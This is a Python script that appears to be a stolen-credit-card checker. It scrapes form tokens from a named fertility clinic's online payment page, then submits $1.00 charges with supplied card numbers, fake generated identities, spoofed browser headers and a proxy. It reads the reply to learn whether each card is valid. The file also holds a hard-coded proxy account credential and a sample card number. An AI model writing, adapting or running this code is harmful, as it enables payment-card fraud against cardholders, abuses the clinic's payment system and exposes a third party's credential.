import random
import string
import requests
from user_agent import generate_user_agent
from proxy import reqproxy, make_request
import json
import re

#============================================
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

#============================================
def Tele(ccx):
    proxy_str = "brd.superproxy.io:33335:brd-customer-hl_5c664e64-zone-datacenter_proxy1:0bnfn02i83lj"
    session, ip = reqproxy(proxy_str)
    #print(f"IP Address: {ip}")
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Mo3gza
        yy = yy.split("20")[1]
    elif "01" in mm or "02" in mm or "01" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
        mm = mm.split("0")[1]

    user = generate_user_agent()
    r = requests.Session()
    r.verify = False
    
    first_name, last_name = generate_full_name()
    kaddress, city, country, postcode, phone =     generate_address()
    kaddress, city, country, postcode, phone = generate_address()
    email = generate_email()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    nr = random.randint(100000, 999999)
    
    cookies = {
        '_fbp': 'fb.1.1776966215002.265798427748092030',
        '_clck': 't2ki4a%5E2%5Eg5g%5E0%5E2304',
        'formillaVisitorGuidcsa2ec8c-70bb-4113-82b7-4a017464e17b': '52aa241b-a5c9-499d-ab9a-32b799c0742e',
        'formillaAutoMessageListcsa2ec8c-70bb-4113-82b7-4a017464e17b': '58067',
        'formillaLastAutoMessageIdDisplayedcsa2ec8c-70bb-4113-82b7-4a017464e17b': '58067',
        '_clsk': 'b2jtds%5E1776966542145%5E2%5E1%5Ee.clarity.ms%2Fcollect',
    }
    
    headers = {
        'authority': 'coastalfertility.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        # 'cookie': '_fbp=fb.1.1776966215002.265798427748092030; _clck=t2ki4a%5E2%5Eg5g%5E0%5E2304; formillaVisitorGuidcsa2ec8c-70bb-4113-82b7-4a017464e17b=52aa241b-a5c9-499d-ab9a-32b799c0742e; formillaAutoMessageListcsa2ec8c-70bb-4113-82b7-4a017464e17b=58067; formillaLastAutoMessageIdDisplayedcsa2ec8c-70bb-4113-82b7-4a017464e17b=58067; _clsk=b2jtds%5E1776966542145%5E2%5E1%5Ee.clarity.ms%2Fcollect',
        #'if-modified-since': 'Thu, 23 Apr 2026 17:20:18 GMT',
        'referer': 'https://www.google.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    response = session.get('https://coastalfertility.com/financial/make-payment/', #cookies=cookies, 
    headers=headers)
    
    ajax = re.search(r"hash=(.*?)'", response.text).group(1)
    currency = re.search(r"data-currency='USD' value='(.*?)'", response.text).group(1)
    state = re.search(r"name='state_76' value='(.*?)'", response.text).group(1)
    version = re.search(r'"version_hash":"(.*?)"', response.text).group(1)
    #print(ajax)
    
    cookies = {
        '_ga_7ZDMTQJ7Y2': 'GS2.1.s1776965623$o1$g0$t1776965623$j60$l0$h0',
        '_ga': 'GA1.1.241501307.1776965623',
        '_clck': 'm1jyqg%5E2%5Eg5g%5E0%5E2304',
        '_fbp': 'fb.1.1776965627037.231908228718968224',
        '_clsk': 'ddub7b%5E1776965628444%5E1%5E1%5Ee.clarity.ms%2Fcollect',
        'formillaVisitorGuidcsa2ec8c-70bb-4113-82b7-4a017464e17b': '2c88c510-70a8-49b8-a758-2b34d062ed5c',
        'formillaAutoMessageListcsa2ec8c-70bb-4113-82b7-4a017464e17b': '58067',
    }
    
    headers = {
        'authority': 'coastalfertility.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarywsHZGUU1UmGnfoGN',
        # 'cookie': '_ga_7ZDMTQJ7Y2=GS2.1.s1776965623$o1$g0$t1776965623$j60$l0$h0; _ga=GA1.1.241501307.1776965623; _clck=m1jyqg%5E2%5Eg5g%5E0%5E2304; _fbp=fb.1.1776965627037.231908228718968224; _clsk=ddub7b%5E1776965628444%5E1%5E1%5Ee.clarity.ms%2Fcollect; formillaVisitorGuidcsa2ec8c-70bb-4113-82b7-4a017464e17b=2c88c510-70a8-49b8-a758-2b34d062ed5c; formillaAutoMessageListcsa2ec8c-70bb-4113-82b7-4a017464e17b=58067',
        'origin': 'https://coastalfertility.com',
        'referer': 'https://coastalfertility.com/financial/make-payment/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'iframe',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    files = [
        ('input_18', (None, '')),
        ('input_10', (None, '$1.00')),
        ('input_11', (None, '1')),
        ('input_15', (None, 'Laboratory - Reproductive Specialty Laboratory|0')),
        ('input_5.1', (None, f'{n}')),
        ('input_5.2[]', (None, f'{mm}')),
        ('input_5.2[]', (None, f'20{yy}')),
        ('input_5.3', (None, f'{cvc}')),
        ('input_5.5', (None, f'{first_name} {last_name}')),
        ('input_17', (None, f'{first_name} {last_name}')),
        ('input_16', (None, f'yellhtetgaung{nr}@gmail.com')),
        ('gform_ajax', (None, f'form_id=76&title=&description=&tabindex=0&theme=gravity-theme&styles=[]&hash={ajax}')),
        ('gform_submission_method', (None, 'iframe')),
        ('gform_theme', (None, 'gravity-theme')),
        ('gform_style_settings', (None, '[]')),
        ('is_submit_76', (None, '1')),
        ('gform_submit', (None, '76')),
        ('gform_currency', (None, f'{currency}')),
        ('gform_unique_id', (None, '')),
        ('state_76', (None, f'{state}')),
        ('gform_target_page_number_76', (None, '0')),
        ('gform_source_page_number_76', (None, '1')),
        ('gform_field_values', (None, '')),
        ('version_hash', (None, f'{version}')),
        ('gform_submission_speeds', (None, '{"pages":{"1":[192964]}}')),
    ]
    
    response = session.post('https://coastalfertility.com/financial/make-payment/', #cookies=cookies, 
    headers=headers, files=files)
    
    try:
        result = re.search(r"class='gfield_description validation_message gfield_validation_message'><!-- (.*?)<\/div><\/fieldset>", response.text).group(1)
    except:
        result = re.search(r"id='gform_confirmation_message_76' class='gform_confirmation_message_76 gform_confirmation_message'>(.*?)<\/div><\/div>", response.text).group(1)
    return result
    
#test_card = "4744722125678468|09|27|542"
#print(Tele(test_card))